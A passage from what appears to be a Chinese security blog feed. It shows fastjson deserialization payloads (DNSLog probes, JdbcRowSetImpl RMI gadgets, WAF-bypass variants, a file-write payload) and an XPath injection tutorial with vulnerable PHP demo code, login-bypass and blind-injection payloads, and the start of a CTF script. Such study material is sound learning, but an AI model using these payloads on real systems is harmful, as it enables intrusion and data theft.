class="hljs-punctuation">&#125;</span></code></pre></div><p>fastjson允许不存在的键值，所以插入dnslog，payload。</p><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;page&quot;</span>:&#123;<span class="hljs-string">&quot;pageNumber&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;pageSize&quot;</span>:<span class="hljs-number">1</span>,&#123;<span class="hljs-string">&quot;zero&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog.com&quot;</span>&#125;&#125;&#125;&#125;</code></pre></div><p>我们要做的就是将以下payload插入正常json传参即可</p><h3 id="1-2-24-1-2-83"><a href="#1-2-24-1-2-83" class="headerlink" title="1.2.24    1.2.83"></a>1.2.24    1.2.83</h3><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;zero&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Exception&quot;</span>,<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.XxException&quot;</span>&#125;&#125;</code></pre></div><h3 id="1-2-24-1-2-68"><a href="#1-2-24-1-2-68" class="headerlink" title="1.2.24-1.2.68"></a>1.2.24-1.2.68</h3><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;zero&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span>&#125;&#125;</code></pre></div><h3 id="1-2-24-1-2-47-（经典）"><a href="#1-2-24-1-2-47-（经典）" class="headerlink" title="1.2.24-1.2.47 （经典）"></a>1.2.24-1.2.47 （经典）</h3><div class="code-wrapper"><pre><code class="hljs perl">&#123;    <span class="hljs-string">&quot;a&quot;</span>: &#123;        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,         <span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>    &#125;,     <span class="hljs-string">&quot;b&quot;</span>: &#123;        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>    &#125;&#125;</code></pre></div><h1 id="fastjson绕waf的骚操作"><a href="#fastjson绕waf的骚操作" class="headerlink" title="fastjson绕waf的骚操作"></a>fastjson绕waf的骚操作</h1><h2 id="添加空白字符"><a href="#添加空白字符" class="headerlink" title="添加空白字符"></a>添加空白字符</h2><p>默认会去除键、值外的空格、<code>\b</code>、<code>\n</code>、<code>\r</code>、<code>\f</code>等</p><h2 id="添加多个逗号"><a href="#添加多个逗号" class="headerlink" title="添加多个逗号"></a>添加多个逗号</h2><div class="code-wrapper"><pre><code class="hljs autohotkey">&#123;,,,,,,<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,,,,,,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>,,,,,, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;</code></pre></div><h2 id="type后的值第一个引号可以替换为其他字符"><a href="#type后的值第一个引号可以替换为其他字符" class="headerlink" title="@type后的值第一个引号可以替换为其他字符"></a>@type后的值第一个引号可以替换为其他字符</h2><div class="code-wrapper"><pre><code class="hljs awk">&#123;<span class="hljs-string">&quot;@type&quot;</span>:xcom.sun.rowset.JdbcRowSetImpl<span class="hljs-string">&quot;,&quot;</span>dataSourceName<span class="hljs-string">&quot;:&quot;</span>rmi:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1099</span>/Exploit<span class="hljs-string">&quot;, &quot;</span>autoCommit<span class="hljs-string">&quot;:true&#125;</span></code></pre></div><h2 id="编码绕过-Unicode-Hex"><a href="#编码绕过-Unicode-Hex" class="headerlink" title="编码绕过(Unicode&#x2F;Hex)"></a>编码绕过(Unicode&#x2F;Hex)</h2><h2 id="对字段添加多个下划线或者减号"><a href="#对字段添加多个下划线或者减号" class="headerlink" title="对字段添加多个下划线或者减号"></a>对字段添加多个下划线或者减号</h2><h3 id="1-2-36版本前-要么都用下划线，要么都用减号"><a href="#1-2-36版本前-要么都用下划线，要么都用减号" class="headerlink" title="1.2.36版本前   (要么都用下划线，要么都用减号)"></a>1.2.36版本前   (要么都用下划线，要么都用减号)</h3><div class="code-wrapper"><pre><code class="hljs actionscript">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&#x27;d_a_t_aSourceName&#x27;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;</code></pre></div><h3 id="1-2-36版本及以后-（下划线、减号混用）"><a href="#1-2-36版本及以后-（下划线、减号混用）" class="headerlink" title="1.2.36版本及以后   （下划线、减号混用）"></a>1.2.36版本及以后   （下划线、减号混用）</h3><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;..&quot;</span>,<span class="hljs-string">&quot;n_-ame&quot;</span>:<span class="hljs-string">&quot;y4&quot;</span>&#125;</code></pre></div><h2 id="1-2-36版本后可以对属性前添加is"><a href="#1-2-36版本后可以对属性前添加is" class="headerlink" title="1.2.36版本后可以对属性前添加is"></a>1.2.36版本后可以对属性前添加is</h2><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;isdataSourceName&quot;</span>: <span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>,<span class="hljs-string">&quot;isautoCommit&quot;</span>: true&#125;&#125;</code></pre></div><h1 id="fastjson1-2-68-存在任意文件写入"><a href="#fastjson1-2-68-存在任意文件写入" class="headerlink" title="fastjson1.2.68 存在任意文件写入"></a>fastjson1.2.68 存在任意文件写入</h1><div class="code-wrapper"><pre><code class="hljs actionscript">&#123;    <span class="hljs-string">&#x27;@type&#x27;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,    <span class="hljs-string">&#x27;@type&#x27;</span>:<span class="hljs-string">&#x27;sun.rmi.server.MarshalOutputStream&#x27;</span>,    <span class="hljs-string">&#x27;out&#x27;</span>:    &#123;        <span class="hljs-string">&#x27;@type&#x27;</span>:<span class="hljs-string">&#x27;java.util.zip.InflaterOutputStream&#x27;</span>,        <span class="hljs-string">&#x27;out&#x27;</span>:        &#123;           <span class="hljs-string">&#x27;@type&#x27;</span>:<span class="hljs-string">&#x27;java.io.FileOutputStream&#x27;</span>,           <span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;dst&#x27;</span>,           <span class="hljs-string">&#x27;append&#x27;</span>:<span class="hljs-literal">false</span>        &#125;,        <span class="hljs-string">&#x27;infl&#x27;</span>:        &#123;            <span class="hljs-string">&#x27;input&#x27;</span>:<span class="hljs-string">&#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;</span>        &#125;,        <span class="hljs-string">&#x27;bufLen&#x27;</span>:<span class="hljs-number">1048576</span>    &#125;,    <span class="hljs-string">&#x27;protocolVersion&#x27;</span>:<span class="hljs-number">1</span>&#125;</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XPATH注入</title>
    <link href="/2023/09/18/XPATH%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/09/18/XPATH%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="XPATH注入"><a href="#XPATH注入" class="headerlink" title="XPATH注入"></a>XPATH注入</h1><p><a href="https://xz.aliyun.com/t/7791#toc-3">XPATH注入学习 - 先知社区 (aliyun.com)</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>XPath注入</strong>类似于<strong>SQL注入</strong>，当网站使用未经正确处理的用户输入查询 XML 数据时，可能发生 XPATH 注入，由于Xpath中数据不像SQL中有权限的概念，用户可通过提交恶意XPATH代码获取到完整xml文档数据</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ul><li>“nodename” – 选取nodename的所有子节点</li><li>“&#x2F;nodename” – 从根节点中选择</li><li>“&#x2F;&#x2F;nodename” – 从当前节点选择</li><li>“..” – 选择当前节点的父节点</li><li>“child::node()” – 选择当前节点的所有子节点</li><li>“@” -选择属性</li><li>“&#x2F;&#x2F;user[position()&#x3D;2] “ 选择节点位置</li></ul><h2 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;t3stt3st.xml&#x27;</span>)) &#123;<span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;t3stt3st.xml&#x27;</span>);<span class="hljs-variable">$user</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<span class="hljs-variable">$ans</span> = <span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ans</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$x_value</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;2&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span>.<span class="hljs-string">&quot;:  &quot;</span> . <span class="hljs-variable">$x_value</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>t3stt3st.xml</p><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root1</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;user1&#x27;</span>&gt;</span>user1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:1<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;user2&#x27;</span>&gt;</span>user2<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:2<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;user3&#x27;</span>&gt;</span>user3<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:3<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;user4&#x27;</span>&gt;</span>user4<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:4<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;user5&#x27;</span>&gt;</span>user5<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:5<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;user6&#x27;</span>&gt;</span>user6<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:6<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;user7&#x27;</span>&gt;</span>user7<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:7<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;user8&#x27;</span>&gt;</span>user8<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:8<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;user9&#x27;</span>&gt;</span>user9<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>KEY:9<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">hctfadmin</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">username</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;hctf1&#x27;</span>&gt;</span>hctf<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>flag:hctf</span><span class="hljs-template-variable">&#123;Dd0g_fac3_t0_k3yboard233&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">hctfadmin</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root1</span>&gt;</span></span></code></pre></div><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>加<code>&#39;</code>有报错</p><p><img src="/2023/09/18/XPATH%E6%B3%A8%E5%85%A5/image-20230918155705893.png" alt="image-20230918155705893"></p><div class="code-wrapper"><pre><code class="hljs 1c">user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;或user1&#x27; or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span></code></pre></div><p>读取当前节点下的所有user</p><p><img src="/2023/09/18/XPATH%E6%B3%A8%E5%85%A5/image-20230918155856014.png" alt="image-20230918155856014"></p><p>终极payload，获取文档所有节点</p><div class="code-wrapper"><pre><code class="hljs gherkin">&#x27;]|<span class="hljs-string">//*</span>|<span class="hljs-string">//*[&#x27;</span></code></pre></div><h2 id="登陆绕过"><a href="#登陆绕过" class="headerlink" title="登陆绕过"></a>登陆绕过</h2><div class="code-wrapper"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span></span><span class="language-xml">        username：</span><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml">        password：</span><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;登录&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><span class="language-php">        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;test.xml&#x27;</span>))&#123;</span><span class="language-php">        <span class="hljs-variable">$xml</span>=<span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;test.xml&#x27;</span>);</span><span class="language-php">        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])&#123;</span><span class="language-php">            <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];</span><span class="language-php">            <span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];</span><span class="language-php">            <span class="hljs-variable">$x_query</span>=<span class="hljs-string">&quot;/accounts/user[username=&#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="hljs-subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;</span><span class="language-php">            <span class="hljs-variable">$result</span> = <span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$x_query</span>);</span><span class="language-php">            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$result</span>)==<span class="hljs-number">0</span>)&#123;</span><span class="language-php">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;登录失败&#x27;</span>;</span><span class="language-php">            &#125;<span class="hljs-keyword">else</span>&#123;</span><span class="language-php">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;登录成功&quot;</span>;</span><span class="language-php">                <span class="hljs-variable">$login_user</span> = <span class="hljs-variable">$result</span>[<span class="hljs-number">0</span>]-&gt;username;</span><span class="language-php">                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you login as <span class="hljs-subst">$login_user</span>&quot;</span>;</span><span class="language-php">            &#125;</span><span class="language-php">        &#125;</span><span class="language-php">    &#125;</span><span class="language-php"><span class="hljs-meta">?&gt;</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">accounts</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>Twe1ve<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>admin@xx.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">accounttype</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">accounttype</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>P@ssword123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>tw@xx.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">accounttype</span>&gt;</span>normal<span class="hljs-tag">&lt;/<span class="hljs-name">accounttype</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">accounts</span>&gt;</span></code></pre></div><p>用户名：test’ or ‘a’&#x3D;’a 密码随意</p><p><img src="/2023/09/18/XPATH%E6%B3%A8%E5%85%A5/image-20230918160301809.png" alt="image-20230918160301809"></p><p>说明在已知用户名的情况下，可以不知道密码进行登录</p><p>但是一般管理员的用户名一般不容易知道</p><p>我们可以利用一般数据库中默认第一个用户为管理员用户，来进行登录</p><div class="code-wrapper"><pre><code class="hljs 1c">&#x27; or 1=1 or &#x27;&#x27;=&#x27;</code></pre></div><p>若管理员不是第一个用户就不行了</p><p><img src="/2023/09/18/XPATH%E6%B3%A8%E5%85%A5/image-20230918160713539.png" alt="image-20230918160713539"></p><p><img src="/2023/09/18/XPATH%E6%B3%A8%E5%85%A5/image-20230918160730589.png" alt="image-20230918160730589"></p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><div class="code-wrapper"><pre><code class="hljs 1c">&#x27; or 1=1 or &#x27;&#x27;=&#x27;</code></pre></div><p>把1&#x3D;1换成盲注的语句即可</p><p>判断顺序</p><ul><li>判断根节点下的节点数</li><li>判断根节点下节点长度&amp;名称</li><li>…..</li><li>重复猜解完所有节点，获取最后的值</li></ul><div class="code-wrapper"><pre><code class="hljs clean"><span class="hljs-string">&#x27;or count(/)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     ###根节点数量为<span class="hljs-number">1</span><span class="hljs-string">&#x27;or count(/*)=1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   ##根节点下只有一个子节点</code></pre></div><p>根节点下子节点的长度</p><div class="code-wrapper"><pre><code class="hljs 1c">&#x27;or string-length(name(/*[1]))=8 or &#x27;&#x27;=&#x27;</code></pre></div><p>爆破</p><div class="code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-string">&#x27;or substring(name(/*[1]), 1, 1)=&#x27;</span><span class="hljs-keyword">a</span><span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-string">&#x27;or substring(name(/*[1]), 2, 1)=&#x27;</span>c<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>..<span class="hljs-string">&#x27;or substring(name(/*[1]), 8, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span></code></pre></div><h5 id="其实后面的大部分都是重复这三步"><a href="#其实后面的大部分都是重复这三步" class="headerlink" title="其实后面的大部分都是重复这三步"></a>其实后面的大部分都是重复这三步</h5><p>猜解出该节点名称为accounts</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-string">&#x27;or count(/accounts)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   /accounts节点数量为1<span class="hljs-string">&#x27;or count(/accounts/*)=2  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     /accounts下有两个节点<span class="hljs-string">&#x27;or string-length(name(/accounts/*[1]))=4  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>    第一个子节点长度为4</code></pre></div><p>猜解accounts下的节点名称：</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-string">&#x27;or substring(name(/accounts/*[1]), 1, 1)=&#x27;</span><span class="hljs-string">u&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>...<span class="hljs-string">&#x27;or substring(name(/accounts/*[1]), 4, 1)=&#x27;</span><span class="hljs-string">r&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span></code></pre></div><p>accounts下子节点名称为user</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-string">&#x27;or count(/accounts/user)=2  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   /accounts下两个子节点都是user</code></pre></div><p>爆破第一个user节点下的节点（这里省了步骤，反正就是查数量、查长度、爆破三步）</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 1, 1)=&#x27;</span><span class="hljs-string">u&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 2, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>...<span class="hljs-string">&#x27;or substring(name(/accounts/user[position()=1]/*[1]), 8, 1)=&#x27;</span>e<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs maxima">&#x27;<span class="hljs-keyword">or</span> <span class="hljs-built_in">string</span>-<span class="hljs-built_in">length</span>((//user[<span class="hljs-built_in">position</span>()=<span class="hljs-number">1</span>]/username[<span class="hljs-built_in">position</span>()=<span class="hljs-number">1</span>]))=<span class="hljs-number">6</span>  <span class="hljs-keyword">or</span> &#x27;&#x27;=&#x27;</code></pre></div><div class="code-wrapper"><pre><code class="hljs lasso"><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),1,1)=&#x27;</span>T<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-params">...</span>.<span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),6,1)=&#x27;</span>e<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span></code></pre></div><h1 id="MyPicDisk-（DASCTF2023-0X401-）"><a href="#MyPicDisk-（DASCTF2023-0X401-）" class="headerlink" title="MyPicDisk   （DASCTF2023 &amp; 0X401 ）"></a>MyPicDisk   （DASCTF2023 &amp; 0X401 ）</h1><p>Booogipop大佬盲注爆破</p><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml">import requests</span><span class="language-xml">import time</span><span class="language-xml">url 